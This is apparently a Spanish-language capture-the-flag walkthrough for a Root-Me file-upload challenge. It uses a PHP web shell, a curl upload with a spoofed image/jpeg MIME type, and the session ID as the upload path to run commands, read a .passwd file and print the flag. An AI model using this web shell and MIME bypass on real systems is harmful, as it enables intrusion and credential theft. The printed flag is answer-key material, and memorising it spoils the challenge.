url del reto: https://www.root-me.org/fr/Challenges/Web-Serveur/File-upload-Type-MIME

#1 crear la shell de php
echo '<?php system($_GET["cmd"]); ?>' > shell.php

# La subimos forzando el MIME type a image/jpeg
```bash
curl -F "file=@shell.php;type=image/jpeg" -F "submit=upload" "http://challenge01.root-me.org/web-serveur/ch21/?action=upload"
<html><head><style>body { background: black; color: white; }</style></head><body><h1>Photo gallery v 0.03</h1><span id=menu/>&nbsp;|&nbsp;<span><a href='?galerie=defaced'>defaced</a></span>&nbsp;|&nbsp;<span><a href='?galerie=upload'>upload</a></span>&nbsp;|&nbsp;<span><a href='?galerie=pirate'><b>pirate</b></a></span><br><hr>File information&nbsp;:<br><ul><li>Upload: shell.php</li><li>Type: image/jpeg</li><li>Size: 0.0302734375 kB</li><li>Stored in: /shell.php</li></ul><b>File uploaded</b>.</body></html>
```
#si subimos una imagen normal y buscamos donde se guardo nos aparece un link asi 
http://challenge01.root-me.org/web-serveur/ch21/galerie/upload/9824b129c2aa6ed807b654547799591c//images.png

como nos podemos dar de cuenta primero la imagen se guarda en una ruta
relativa pero con un hash a forma de ruta,la opcion mas comoda es tomar
phpsesid como esa ruta relariva

esto lo comprobamos aplicando un v al comando de curl
```bssh
curl -F "file=@shell.php;type=image/jpeg" -F "submit=upload" "http://challenge01.root-me.org/web-serveur/ch21/?action=upload" -v
* Host challenge01.root-me.org:80 was resolved.
* IPv6: 2001:bc8:35b0:c166::151
* IPv4: 212.129.38.224
*   Trying [2001:bc8:35b0:c166::151]:80...
* Immediate connect fail for 2001:bc8:35b0:c166::151: Network is unreachable
*   Trying 212.129.38.224:80...
* Established connection to challenge01.root-me.org (212.129.38.224 port 80) from 192.168.1.2 port 44346
* using HTTP/1.x
> POST /web-serveur/ch21/?action=upload HTTP/1.1
> Host: challenge01.root-me.org
> User-Agent: curl/8.17.0
> Accept: */*
> Content-Length: 337
> Content-Type: multipart/form-data; boundary=------------------------wtZ6G6rTiYmo7iBukNK8Pj
>
* upload completely sent off: 337 bytes
< HTTP/1.1 200 OK
< Server: nginx
< Date: Sat, 20 Dec 2025 15:22:35 GMT
< Content-Type: text/html; charset=UTF-8
< Transfer-Encoding: chunked
< Connection: keep-alive
< Vary: Accept-Encoding
< Set-Cookie: PHPSESSID=e5a317d5742009a514fbb8a35417d8d2; path=/web-serveur/ch21/; HttpOnly
< Expires: Thu, 19 Nov 1981 08:52:00 GMT
< Cache-Control: no-store, no-cache, must-revalidate
< Pragma: no-cache
<
* Connection #0 to host challenge01.root-me.org:80 left intact
<html><head><style>body { background: black; color: white; }</style></head><body><h1>Photo gallery v 0.03</h1><span id=menu/>&nbsp;|&nbsp;<span><a href='?galerie=defaced'>defaced</a></span>&nbsp;|&nbsp;<span><a href='?galerie=upload'>upload</a></span>&nbsp;|&nbsp;<span><a href='?galerie=pirate'><b>pirate</b></a></span><br><hr>File information&nbsp;:<br><ul><li>Upload: shell.php</li><li>Type: image/jpeg</li><li>Size: 0.0302734375 kB</li><li>Stored in: /shell.php</li></ul><b>File uploaded</b>.</body></html>
```
teniendo el phpsessid podemos volver a buscar la shell y ejecutar comandos
```bash

curl -b "PHPSESSID=e5a317d5742009a514fbb8a35417d8d2" "http://challenge01.root-me.org/web-serveur/ch21/galerie/upload/e5a317d5742009a514fbb8a35417d8d2/shell.php?cmd=ls%20-la"
```

como ya es efectiva,buscamos en los directorios mas arriba para buscar el archivo .passwd
```bash
$ curl -b "PHPSESSID=e5a317d5742009a514fbb8a35417d8d2" "http://challenge01.root-me.org/web-serveur/ch21/galerie/upload/e5a317d5742009a514fbb8a35417d8d2/shell.php?cmd=ls%20-la%20../../../"   total 52
drwxr-s---  4 web-serveur-ch21 www-data  4096 Dec 12  2021 .
drwxr-s--x 99 challenge        www-data  4096 Mar 21  2025 ..
-r-x------  1 root             root       723 Aug  4  2022 ._init
-r--------  1 challenge        challenge  274 Dec 10  2021 ._nginx.http-level.inc
-r--------  1 challenge        challenge  655 Dec 10  2021 ._nginx.server-level.inc
-r--------  1 root             www-data  3985 Dec 18  2021 ._perms
-r--------  1 challenge        challenge  574 Dec 10  2021 ._php-fpm.pool.inc
-rw-r-----  1 root             www-data    44 Dec 10  2021 .git
-rw-r-----  1 root             www-data   181 Dec 12  2021 .gitignore
-r--------  1 web-serveur-ch21 www-data    26 Dec 10  2021 .passwd
drwxr-s---  5 web-serveur-ch21 www-data  4096 Dec 12  2021 galerie
-rw-r-----  1 web-serveur-ch21 www-data  3825 Dec 10  2021 index.php
drwxrwxrwx  2 web-serveur-ch21 www-data  4096 Dec 20 16:22 tmp```
```

curl -b "PHPSESSID=e5a317d5742009a514fbb8a35417d8d2" "http://challenge01.root-me.org/web-serveur/ch21/galerie/upload/e5a317d5742009a514fbb8a35417d8d2/shell.php?cmd=cat%20../../../.passwd"
a7n4nizpgQgnPERy89uanf6T4
```
la flag seria : a7n4nizpgQgnPERy89uanf6T4
